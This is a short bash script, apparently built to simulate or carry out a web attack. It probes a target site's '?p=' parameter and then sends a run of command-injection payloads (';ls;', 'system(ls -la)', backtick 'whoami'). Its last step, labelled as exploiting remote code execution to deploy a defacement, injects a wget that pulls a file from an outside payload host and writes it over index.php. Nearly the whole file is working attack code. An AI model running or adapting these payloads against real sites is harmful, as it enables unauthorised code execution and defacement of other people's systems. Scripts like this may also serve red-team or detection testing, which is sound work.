#!/bin/bash

echo "Loading configs/$1"
source configs/$1

echo "Phishing around"

curl -s "https://$TARGET_DOMAIN/?p=22"  > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=23" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;ls;" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;%20echo%20ls;" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;%20echo%20system(ls);//" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;%20echo%20system(ls%20-la);//" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;%20echo%20\`ls%20-la\`;//" > /dev/null
attack_wait $(shuf -i 0-8 -n 1)s

curl -s "https://$TARGET_DOMAIN/?p=999;%20echo%20\`whoami\`;//" > /dev/null
attack_wait $(shuf -i 10-20 -n 1)s

echo "Exploiting RCE to deploy defacement."
curl -s "https://$TARGET_DOMAIN/?p=9999;%20echo%20\`wget%20-O%20index.php%20http://$PAYLOAD_DOMAIN/index.html\`;%20//" > /dev/null

echo "done."